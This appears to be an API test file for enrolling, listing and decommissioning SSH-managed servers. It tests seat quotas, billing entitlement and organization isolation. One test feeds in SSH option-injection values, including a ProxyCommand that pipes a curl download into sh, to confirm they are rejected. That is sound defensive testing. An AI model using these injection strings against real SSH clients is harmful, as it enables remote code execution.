import { beforeAll, beforeEach, describe, expect, it } from "bun:test"
import { SEATED_STATUSES } from "../../lib/billing/seats"
import { authorizedKeysForServer } from "../../lib/servers/authorized-keys"
import { enrollServer } from "../../lib/servers/enrollment"
import {
  DECOMMISSION_DELAY_MS,
  decommissionDueServers,
} from "../../lib/servers/expire"
import { CHART_MAX_POINTS } from "../../lib/servers/metrics"
import { SshAddressInvalidError } from "../../lib/servers/ssh-address"
import { bootApiTestServer, resetDb } from "../../testing"
import { createOrganizationWithMembers } from "../../testing/factories"
import { ED25519_KEY, SECOND_ED25519_KEY } from "../../testing/keys"
import { HOST_PUBLIC_KEY, PROBE_REPORT } from "../../testing/probe"
import { apiRequest } from "../../testing/request"

type Session = { token: string }

interface EnrollBody {
  server_id: string
  enrollment_token: string
  release: { version: string; url: string; sha256: string; signature: string }
}

interface ServerBody {
  id: string
  name: string
  host: string | null
  port: number
  user: string
  arch: string
  status: string
  stale: boolean
  decommission_at: string | null
  agent_version: string | null
  target_version: string | null
  host_fingerprint: string | null
  assigned_user_id: string | null
  last_heartbeat_at: string | null
  usage: { at: string; disk: number; ram: number; load: number } | null
  created_at: string
}

interface ServerDetailBody extends ServerBody {
  metrics: { at: string; disk: number }[]
  events: { action: string }[]
}

interface ErrorBody {
  error: { code: string; message: string; fix?: string }
}

const DAY_MS = 86_400_000

const SSH_INJECTION = "x\nProxyCommand curl a.bc|sh"

function addDevice(session: Session, name: string, publicKey: string) {
  return apiRequest<{ data: { id: string } }>("/me/devices", {
    body: { name, public_key: publicKey },
    session,
  })
}

function enroll(
  session: Session,
  deviceId: string,
  host: string,
  extra: Record<string, unknown> = {}
) {
  return apiRequest<EnrollBody & ErrorBody>("/servers/enroll", {
    body: { device_id: deviceId, host, probe: PROBE_REPORT, ...extra },
    session,
  })
}

function exchange(enrollmentToken: string) {
  return apiRequest<{ server_token: string }>("/agent/exchange", {
    body: {
      enrollment_token: enrollmentToken,
      host_public_key: HOST_PUBLIC_KEY,
      agent_version: "1.4.0",
      arch: "amd64",
    },
  })
}

function listServers(session: Session) {
  return apiRequest<{ data: ServerBody[] }>("/servers", { session })
}

async function repairOf(status: "grace" | "suspended") {
  const { prisma } = await bootApiTestServer()
  const { members } = await createOrganizationWithMembers({
    roles: ["owner"],
    subscription: {},
  })
  const [owner] = members
  const device = await addDevice(owner, "MacBook", ED25519_KEY)
  const deviceId = device.json.data.id
  const first = await enroll(owner, deviceId, "vps.test")

  await exchange(first.json.enrollment_token)
  await prisma.server.update({
    where: { id: first.json.server_id },
    data: { status },
  })

  const again = await enroll(owner, deviceId, "vps.test")
  const exchanged = await exchange(again.json.enrollment_token)
  const state = await apiRequest("/agent/state", {
    bearer: exchanged.json.server_token,
  })

  return {
    serverId: first.json.server_id,
    again,
    exchanged,
    state,
    server: await prisma.server.findUniqueOrThrow({
      where: { id: first.json.server_id },
    }),
  }
}

async function enrolledServer(
  session: Session,
  host: string,
  publicKey: string = ED25519_KEY
) {
  const device = await addDevice(session, `poste ${host}`, publicKey)
  const enrolled = await enroll(session, device.json.data.id, host)
  const exchanged = await exchange(enrolled.json.enrollment_token)

  return {
    serverId: enrolled.json.server_id,
    token: exchanged.json.server_token,
  }
}

describe("POST /servers/enroll", () => {
  beforeAll(async () => {
    await bootApiTestServer()
  })

  beforeEach(async () => {
    await resetDb()
  })

  it("refuses without a session", async () => {
    const response = await apiRequest("/servers/enroll", {
      body: { device_id: "x", host: "vps.test", probe: PROBE_REPORT },
    })

    expect(response.status).toBe(401)
  })

  it("creates an enrolling server and hands out a one-hour token", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "vps.test", {
      port: 2222,
      ssh_user: "dev",
    })

    expect(response.status).toBe(201)
    expect(response.json.enrollment_token.length).toBeGreaterThan(20)
    expect(response.json.release.version.length).toBeGreaterThan(0)

    const server = await prisma.server.findUniqueOrThrow({
      where: { id: response.json.server_id },
    })

    expect(server.status).toBe("enrolling")
    expect(server.host).toBe("vps.test")
    expect(server.port).toBe(2222)
    expect(server.sshUser).toBe("dev")
    expect(server.deviceId).toBe(device.json.data.id)
    expect(server.assignedUserId).toBe(owner.user.id)
    expect(server.serverTokenHash).toBeNull()
    expect(server.enrollmentTokenHash).not.toBeNull()
    expect(server.enrollmentTokenHash).not.toBe(response.json.enrollment_token)

    const ttl = (server.enrollmentExpiresAt?.getTime() ?? 0) - Date.now()

    expect(ttl).toBeLessThanOrEqual(3_600_000)
    expect(ttl).toBeGreaterThan(3_500_000)
  })

  it("defaults the port to 22 and the ssh user to dev", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "vps.test")
    const server = await prisma.server.findUniqueOrThrow({
      where: { id: response.json.server_id },
    })

    expect(server.port).toBe(22)
    expect(server.sshUser).toBe("dev")
  })

  it("refuses a device that is not the caller's", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "member"],
      subscription: {},
    })
    const [owner, member] = members
    const device = await addDevice(member, "Poste du membre", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "vps.test")

    expect(response.status).toBe(404)
    expect(response.json.error.code).toBe("not_found")
  })

  it("refuses to enroll without a subscription and points at billing", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: null,
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const me = await apiRequest<{ entitlement: string }>("/me", {
      session: owner,
    })
    const response = await enroll(owner, device.json.data.id, "vps.test")

    expect(me.json.entitlement).toBe("suspended")
    expect(response.status).toBe(403)
    expect(response.json.error.code).toBe("entitlement_required")
    expect(response.json.error.fix).toContain("/dashboard/billing")
  })

  it("refuses to enroll on a suspended subscription", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { status: "canceled" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "vps.test")

    expect(response.status).toBe(403)
    expect(response.json.error.code).toBe("server_suspended")
    expect(response.json.error.fix).toContain("/dashboard/billing")
  })

  it("refuses the third server of a two-seat trial with a fix", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id

    expect((await enroll(owner, deviceId, "vps-1.test")).status).toBe(201)
    expect((await enroll(owner, deviceId, "vps-2.test")).status).toBe(201)

    const third = await enroll(owner, deviceId, "vps-3.test")

    expect(third.status).toBe(403)
    expect(third.json.error.code).toBe("seat_quota_reached")
    expect(third.json.error.fix).toBeTruthy()
  })

  it("follows the subscription quantity when the organization has one", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 1, status: "active" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id

    expect((await enroll(owner, deviceId, "vps-1.test")).status).toBe(201)

    const second = await enroll(owner, deviceId, "vps-2.test")

    expect(second.status).toBe(403)
    expect(second.json.error.code).toBe("seat_quota_reached")
  })

  it("frees the seat of a revoked server", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps-1.test")

    await enroll(owner, deviceId, "vps-2.test")
    await prisma.server.update({
      where: { id: first.json.server_id },
      data: { status: "revoked" },
    })

    expect((await enroll(owner, deviceId, "vps-3.test")).status).toBe(201)
  })

  it("records the enrolment in the audit trail", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "vps.test")
    const event = await prisma.event.findFirstOrThrow({
      where: { action: "server.enrolled" },
    })

    expect(event.targetId).toBe(response.json.server_id)
    expect(event.targetType).toBe("server")
    expect(event.actorUserId).toBe(owner.user.id)
    expect(event.organizationId).toBe(organization.id)
  })

  it("repairs a known host instead of adding a second server", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps.test", { port: 2222 })
    const second = await enroll(owner, deviceId, "vps.test", {
      port: 2222,
      ssh_user: "ops",
    })

    expect(second.status).toBe(201)
    expect(second.json.server_id).toBe(first.json.server_id)
    expect(second.json.enrollment_token).not.toBe(first.json.enrollment_token)

    const servers = await prisma.server.findMany({
      where: { organizationId: organization.id },
    })

    expect(servers).toHaveLength(1)
    expect(servers[0]?.status).toBe("enrolling")
    expect(servers[0]?.sshUser).toBe("dev")
    expect(servers[0]?.serverTokenHash).toBeNull()
  })

  it("leaves a working server its token until the exchange gives it another", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps.test")
    const held = await exchange(first.json.enrollment_token)

    // No exchange follows (the binary upload failed): the held token must survive ExpireEnrollments.
    const again = await enroll(owner, deviceId, "vps.test")
    const still = await apiRequest("/agent/state", {
      bearer: held.json.server_token,
    })
    const server = await prisma.server.findUniqueOrThrow({
      where: { id: first.json.server_id },
    })

    expect(again.status).toBe(201)
    expect(still.status).toBe(200)
    expect(server.status).toBe("active")
    expect(server.serverTokenHash).not.toBeNull()

    const exchanged = await exchange(again.json.enrollment_token)
    const replaced = await apiRequest("/agent/state", {
      bearer: exchanged.json.server_token,
    })

    expect(exchanged.status).toBe(200)
    expect(replaced.status).toBe(200)
  })

  it("refuses a second exchange of the same enrolment token", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const enrolled = await enroll(owner, device.json.data.id, "vps.test")

    const first = await exchange(enrolled.json.enrollment_token)
    const second = await exchange(enrolled.json.enrollment_token)

    expect(first.status).toBe(200)
    expect(second.status).toBe(409)
  })

  it("hands a suspended server a token that works again", async () => {
    const { again, exchanged, serverId, server, state } =
      await repairOf("suspended")

    expect(again.status).toBe(201)
    expect(again.json.server_id).toBe(serverId)
    expect(exchanged.status).toBe(200)
    expect(state.status).toBe(200)
    expect(server.status).toBe("active")
  })

  it("brings a server in grace back to active", async () => {
    const { again, exchanged, serverId, server } = await repairOf("grace")

    expect(again.status).toBe(201)
    expect(again.json.server_id).toBe(serverId)
    expect(exchanged.status).toBe(200)
    expect(server.status).toBe("active")
  })

  it("repairs on a full quota but still refuses an unknown host", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 1, status: "active" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps-1.test")
    const repair = await enroll(owner, deviceId, "vps-1.test")
    const unknown = await enroll(owner, deviceId, "vps-2.test")

    expect(repair.status).toBe(201)
    expect(repair.json.server_id).toBe(first.json.server_id)
    expect(unknown.status).toBe(403)
    expect(unknown.json.error.code).toBe("seat_quota_reached")
  })

  it("does not read the same host in another organization as a repair", async () => {
    const { prisma } = await bootApiTestServer()
    const one = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const other = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [oneOwner] = one.members
    const [otherOwner] = other.members
    const oneDevice = await addDevice(oneOwner, "MacBook", ED25519_KEY)
    const otherDevice = await addDevice(
      otherOwner,
      "ThinkPad",
      SECOND_ED25519_KEY
    )
    const oneServer = await enroll(oneOwner, oneDevice.json.data.id, "vps.test")
    const otherServer = await enroll(
      otherOwner,
      otherDevice.json.data.id,
      "vps.test"
    )

    expect(otherServer.status).toBe(201)
    expect(otherServer.json.server_id).not.toBe(oneServer.json.server_id)
    expect(await prisma.server.count({ where: { host: "vps.test" } })).toBe(2)
  })

  it("repairs a known host from any device of the organization, without a second seat", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const laptop = await addDevice(owner, "MacBook", ED25519_KEY)
    const desktop = await addDevice(owner, "ThinkPad", SECOND_ED25519_KEY)
    const first = await enroll(owner, laptop.json.data.id, "vps.test")

    await exchange(first.json.enrollment_token)

    const second = await enroll(owner, desktop.json.data.id, "vps.test")
    const third = await enroll(owner, laptop.json.data.id, "other.test")

    expect(second.status).toBe(201)
    expect(second.json.server_id).toBe(first.json.server_id)
    expect(third.status).toBe(201)
    expect(await prisma.server.count({ where: { host: "vps.test" } })).toBe(1)

    const repaired = await prisma.server.findUniqueOrThrow({
      where: { id: first.json.server_id },
    })

    expect(repaired.deviceId).toBe(desktop.json.data.id)
    expect(repaired.enrollmentKey).not.toContain(desktop.json.data.id)
  })

  it("reads the host without regard to case or surrounding spaces", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const first = await enroll(owner, device.json.data.id, "VPS.Test")
    const second = await enroll(owner, device.json.data.id, "  vps.test ")

    expect(second.json.server_id).toBe(first.json.server_id)

    const stored = await prisma.server.findUniqueOrThrow({
      where: { id: first.json.server_id },
    })

    expect(stored.host).toBe("vps.test")
    expect(stored.name).toBe("vps.test")
  })

  it("refuses an address or an account that would reach an SSH configuration as a directive", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner", "member"],
      subscription: {},
    })
    const [, member] = members
    const device = await addDevice(member, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const refused = [
      await enroll(member, deviceId, "vps.test", { ssh_user: SSH_INJECTION }),
      await enroll(member, deviceId, "vps.test", {
        ssh_user: "-oProxyCommand=sh",
      }),
      await enroll(member, deviceId, SSH_INJECTION),
      await enroll(member, deviceId, "-oProxyCommand=sh"),
      await enroll(member, deviceId, "vps.test%h"),
      await enroll(member, deviceId, "vps.test", {
        fingerprint: `SHA256:abc${SSH_INJECTION}`,
      }),
    ]

    for (const response of refused) {
      expect(response.status).toBe(422)
      expect(response.json.error.code).toBe("validation")
    }

    expect(refused[2]?.json.error.message).toContain("host")
    expect(
      await prisma.server.count({ where: { organizationId: organization.id } })
    ).toBe(0)
  })

  it("enrolls an IPv6 address as it is typed", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const response = await enroll(owner, device.json.data.id, "2001:DB8::1")

    expect(response.status).toBe(201)

    const server = await prisma.server.findUniqueOrThrow({
      where: { id: response.json.server_id },
    })

    expect(server.host).toBe("2001:db8::1")
  })

  it("never writes a malformed address, even when the schema is bypassed", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const actor = { userId: owner.user.id, organizationId: organization.id }
    const input = {
      device_id: device.json.data.id,
      host: "vps.test",
      probe: PROBE_REPORT,
    }

    await expect(
      enrollServer(actor, { ...input, ssh_user: SSH_INJECTION })
    ).rejects.toBeInstanceOf(SshAddressInvalidError)
    await expect(
      enrollServer(actor, { ...input, host: SSH_INJECTION })
    ).rejects.toBeInstanceOf(SshAddressInvalidError)
    await expect(
      enrollServer(actor, { ...input, fingerprint: "SHA256:a b" })
    ).rejects.toBeInstanceOf(SshAddressInvalidError)
    expect(
      await prisma.server.count({ where: { organizationId: organization.id } })
    ).toBe(0)
  })

  it("keeps a repaired server in the entitlement its organization holds", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 3, status: "past_due" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const first = await enroll(owner, device.json.data.id, "vps.test")

    await exchange(first.json.enrollment_token)

    const graceDeadline = new Date(Date.now() - DAY_MS)

    await prisma.server.update({
      where: { id: first.json.server_id },
      data: {
        status: "suspended",
        suspendedReason: "billing",
        entitlementValidUntil: graceDeadline,
      },
    })

    const repair = await enroll(owner, device.json.data.id, "vps.test")
    const swapped = await exchange(repair.json.enrollment_token)
    const stored = await prisma.server.findUniqueOrThrow({
      where: { id: first.json.server_id },
    })
    const state = await apiRequest<{ entitlement: string }>("/agent/state", {
      bearer: swapped.json.server_token,
    })
    const fresh = await enroll(owner, device.json.data.id, "second.test")
    const freshServer = await prisma.server.findUniqueOrThrow({
      where: { id: fresh.json.server_id },
    })

    expect(repair.status).toBe(201)
    expect(swapped.status).toBe(200)
    expect(stored.status).toBe("suspended")
    expect(stored.entitlementValidUntil?.toISOString()).toBe(
      graceDeadline.toISOString()
    )
    expect(state.json.entitlement).toBe("suspended")
    expect(freshServer.organizationId).toBe(organization.id)

    await exchange(fresh.json.enrollment_token)

    const enrolledInGrace = await prisma.server.findUniqueOrThrow({
      where: { id: fresh.json.server_id },
    })

    expect(enrolledInGrace.status).toBe("grace")
    expect(enrolledInGrace.entitlementValidUntil?.getTime()).toBeGreaterThan(
      Date.now()
    )
  })

  it("enrolls a fresh server when the known host was revoked", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 1, status: "active" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps.test")

    await apiRequest(`/servers/${first.json.server_id}`, {
      method: "DELETE",
      session: owner,
    })

    const again = await enroll(owner, deviceId, "vps.test")

    expect(again.status).toBe(201)
    expect(again.json.server_id).not.toBe(first.json.server_id)
    expect(await prisma.server.count({ where: { host: "vps.test" } })).toBe(2)
  })

  it("enrolls a fresh server after the host was fully decommissioned", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 1, status: "active" },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const first = await enroll(owner, deviceId, "vps.test")

    await apiRequest(`/servers/${first.json.server_id}`, {
      method: "DELETE",
      session: owner,
    })

    const decommissioned = await decommissionDueServers(
      new Date(Date.now() + DECOMMISSION_DELAY_MS + DAY_MS)
    )

    expect(decommissioned).toEqual([first.json.server_id])

    const again = await enroll(owner, deviceId, "vps.test")

    expect(again.status).toBe(201)
    expect(again.json.server_id).not.toBe(first.json.server_id)
    expect(await prisma.server.count({ where: { host: "vps.test" } })).toBe(1)
  })

  it("keeps one server and one seat when two enrolments of the same unknown host race", async () => {
    const { prisma } = await bootApiTestServer()
    const { organization, members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: { quantity: 2 },
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)
    const deviceId = device.json.data.id
    const [one, two] = await Promise.all([
      enroll(owner, deviceId, "vps.test"),
      enroll(owner, deviceId, "vps.test"),
    ])

    expect(one.status).toBe(201)
    expect(two.status).toBe(201)
    expect(one.json.server_id).toBe(two.json.server_id)

    const servers = await prisma.server.findMany({
      where: { organizationId: organization.id },
    })

    expect(servers).toHaveLength(1)

    const seated = await prisma.server.count({
      where: {
        organizationId: organization.id,
        status: { in: SEATED_STATUSES },
      },
    })

    expect(seated).toBe(1)
  })
})

describe("GET /servers", () => {
  beforeAll(async () => {
    await bootApiTestServer()
  })

  beforeEach(async () => {
    await resetDb()
  })

  it("refuses without a session", async () => {
    expect((await apiRequest("/servers")).status).toBe(401)
  })

  it("lists the servers of the active organization only", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const other = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const [otherOwner] = other.members

    await enrolledServer(owner, "vps-mien.test")
    await enrolledServer(otherOwner, "vps-autre.test", SECOND_ED25519_KEY)

    const response = await listServers(owner)

    expect(response.status).toBe(200)
    expect(response.json.data).toHaveLength(1)
    expect(response.json.data[0]).toMatchObject({
      host: "vps-mien.test",
      port: 22,
      user: "dev",
      status: "active",
      arch: "amd64",
      stale: false,
    })
  })

  it("marks a server without heartbeat for 24 hours as stale, without touching its entitlement", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const { serverId, token } = await enrolledServer(owner, "vps.test")

    await apiRequest("/agent/heartbeat", {
      body: {
        disk: 12,
        ram: 30,
        load: 0.4,
        sessions: [],
        stack_version: "1.0.0",
        modules: [],
      },
      bearer: token,
    })

    expect((await listServers(owner)).json.data[0].stale).toBe(false)

    await prisma.server.update({
      where: { id: serverId },
      data: { lastHeartbeatAt: new Date(Date.now() - 25 * 3_600_000) },
    })

    const listed = (await listServers(owner)).json.data[0]

    expect(listed.stale).toBe(true)
    expect(listed.status).toBe("active")

    const stored = await prisma.server.findUniqueOrThrow({
      where: { id: serverId },
    })

    expect(stored.status).toBe("active")

    const state = await apiRequest<{ entitlement: string }>("/agent/state", {
      bearer: token,
    })

    expect(state.status).toBe(200)
    expect(state.json.entitlement).toBe("valid")
  })
})

describe("GET /servers/:id", () => {
  beforeAll(async () => {
    await bootApiTestServer()
  })

  beforeEach(async () => {
    await resetDb()
  })

  it("returns the server with its metrics and its events", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const { serverId, token } = await enrolledServer(owner, "vps.test")

    await apiRequest("/agent/heartbeat", {
      body: {
        disk: 41,
        ram: 55,
        load: 1.2,
        sessions: ["dev"],
        stack_version: "1.0.0",
        modules: ["core.system"],
      },
      bearer: token,
    })

    const response = await apiRequest<{ data: ServerDetailBody }>(
      `/servers/${serverId}`,
      { session: owner }
    )

    expect(response.status).toBe(200)
    expect(response.json.data.host).toBe("vps.test")
    expect(response.json.data.metrics).toHaveLength(1)
    expect(response.json.data.metrics[0].disk).toBe(41)
    expect(response.json.data.usage).toMatchObject({ disk: 41, ram: 55 })

    const list = await apiRequest<{ data: ServerBody[] }>("/servers", {
      session: owner,
    })

    expect(list.json.data[0].usage).toMatchObject({ disk: 41, ram: 55 })
    expect(response.json.data.events.map((event) => event.action)).toContain(
      "server.enrolled"
    )
  })

  it("hides a server of another organization", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const other = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const [otherOwner] = other.members
    const { serverId } = await enrolledServer(
      otherOwner,
      "vps-autre.test",
      SECOND_ED25519_KEY
    )
    const response = await apiRequest<ErrorBody>(`/servers/${serverId}`, {
      session: owner,
    })

    expect(response.status).toBe(404)
    expect(response.json.error.code).toBe("not_found")
  })

  it("reduces the window to what a chart draws, newest reading last", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const { serverId } = await enrolledServer(owner, "vps.test")
    const rows = Array.from({ length: CHART_MAX_POINTS * 2 }, (_, index) => {
      const at = new Date(Date.now() - (CHART_MAX_POINTS * 2 - index) * 60_000)

      return {
        serverId,
        at,
        sample: {
          at: at.toISOString(),
          disk: index,
          ram: 1,
          load: 0,
          sessions: [],
          stack_version: null,
          modules: [],
        },
      }
    })

    await prisma.serverMetric.createMany({ data: rows })

    const response = await apiRequest<{
      data: { metrics: { disk: number }[] }
    }>(`/servers/${serverId}`, { session: owner })

    expect(response.status).toBe(200)
    expect(response.json.data.metrics).toHaveLength(CHART_MAX_POINTS)
    expect(response.json.data.metrics.at(-1)?.disk).toBe(
      CHART_MAX_POINTS * 2 - 1
    )
  })
})

describe("DELETE /servers/:id", () => {
  beforeAll(async () => {
    await bootApiTestServer()
  })

  beforeEach(async () => {
    await resetDb()
  })

  it("refuses a member", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "member"],
      subscription: {},
    })
    const [owner, member] = members
    const { serverId } = await enrolledServer(owner, "vps.test")
    const response = await apiRequest<ErrorBody>(`/servers/${serverId}`, {
      method: "DELETE",
      session: member,
    })

    expect(response.status).toBe(403)
    expect(response.json.error.code).toBe("forbidden")
  })

  it("removes the keys from /agent/state and schedules the decommission at seven days", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "admin"],
      subscription: {},
    })
    const [owner, admin] = members
    const { serverId, token } = await enrolledServer(owner, "vps.test")

    expect(await authorizedKeysForServer(prisma, serverId)).toEqual([
      ED25519_KEY,
    ])

    const state = await apiRequest<{ authorized_keys: string[] }>(
      "/agent/state",
      { bearer: token }
    )

    expect(state.json.authorized_keys).toEqual([ED25519_KEY])

    const deleted = await apiRequest(`/servers/${serverId}`, {
      method: "DELETE",
      session: admin,
    })

    expect(deleted.status).toBe(204)
    expect(await authorizedKeysForServer(prisma, serverId)).toEqual([])

    const refused = await apiRequest<ErrorBody>("/agent/state", {
      bearer: token,
    })

    expect(refused.status).toBe(401)
    expect(refused.json.error.code).toBe("invalid_server_token")

    const server = await prisma.server.findUniqueOrThrow({
      where: { id: serverId },
    })

    expect(server.status).toBe("revoked")
    expect(server.assignedUserId).toBeNull()

    const delay = (server.decommissionAt?.getTime() ?? 0) - Date.now()

    expect(DECOMMISSION_DELAY_MS).toBe(7 * DAY_MS)
    expect(delay).toBeLessThanOrEqual(DECOMMISSION_DELAY_MS)
    expect(delay).toBeGreaterThan(DECOMMISSION_DELAY_MS - 60_000)

    const event = await prisma.event.findFirstOrThrow({
      where: { action: "server.deleted" },
    })

    expect(event.targetId).toBe(serverId)
    expect(event.actorUserId).toBe(admin.user.id)
  })

  it("purges the server on a second deletion, without pushing the deadline", async () => {
    const { prisma } = await bootApiTestServer()
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "admin"],
      subscription: {},
    })
    const [owner, admin] = members
    const { serverId } = await enrolledServer(owner, "vps.test")

    const first = await apiRequest(`/servers/${serverId}`, {
      method: "DELETE",
      session: admin,
    })

    expect(first.status).toBe(204)

    const revoked = await prisma.server.findUniqueOrThrow({
      where: { id: serverId },
    })
    const deadline = revoked.decommissionAt?.getTime() ?? 0

    const second = await apiRequest(`/servers/${serverId}`, {
      method: "DELETE",
      session: admin,
    })

    expect(second.status).toBe(204)
    expect(
      await prisma.server.findUnique({ where: { id: serverId } })
    ).toBeNull()

    // The second DELETE purges rather than pushing back the first deadline.
    expect(deadline).toBeGreaterThan(0)

    const purged = await prisma.event.findFirstOrThrow({
      where: { action: "server.purged" },
    })

    expect(purged.targetId).toBe(serverId)
    expect(purged.actorUserId).toBe(admin.user.id)
  })

  it("answers 404 once the server has been purged", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "admin"],
      subscription: {},
    })
    const [owner, admin] = members
    const { serverId } = await enrolledServer(owner, "vps.test")

    for (const expected of [204, 204, 404]) {
      const response = await apiRequest(`/servers/${serverId}`, {
        method: "DELETE",
        session: admin,
      })

      expect(response.status).toBe(expected)
    }
  })

  it("carries the decommission date in the server it lists", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner", "admin"],
      subscription: {},
    })
    const [owner, admin] = members
    const { serverId } = await enrolledServer(owner, "vps.test")

    const before = await apiRequest<{ data: ServerBody[] }>("/servers", {
      session: admin,
    })

    expect(before.json.data[0].decommission_at).toBeNull()

    await apiRequest(`/servers/${serverId}`, {
      method: "DELETE",
      session: admin,
    })

    const after = await apiRequest<{ data: ServerBody[] }>("/servers", {
      session: admin,
    })

    expect(after.json.data[0].decommission_at).not.toBeNull()
  })

  it("refuses a server of another organization", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const other = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const [otherOwner] = other.members
    const { serverId } = await enrolledServer(
      otherOwner,
      "vps-autre.test",
      SECOND_ED25519_KEY
    )
    const response = await apiRequest(`/servers/${serverId}`, {
      method: "DELETE",
      session: owner,
    })

    expect(response.status).toBe(404)
  })
})

describe("GET /me/servers", () => {
  beforeAll(async () => {
    await bootApiTestServer()
  })

  beforeEach(async () => {
    await resetDb()
  })

  it("reports the real host, port and ssh user", async () => {
    const { members } = await createOrganizationWithMembers({
      roles: ["owner"],
      subscription: {},
    })
    const [owner] = members
    const device = await addDevice(owner, "MacBook", ED25519_KEY)

    await enroll(owner, device.json.data.id, "vps.test", {
      port: 2222,
      ssh_user: "jordan",
    })

    const response = await apiRequest<{
      data: { host: string; port: number; user: string; key_ready: boolean }[]
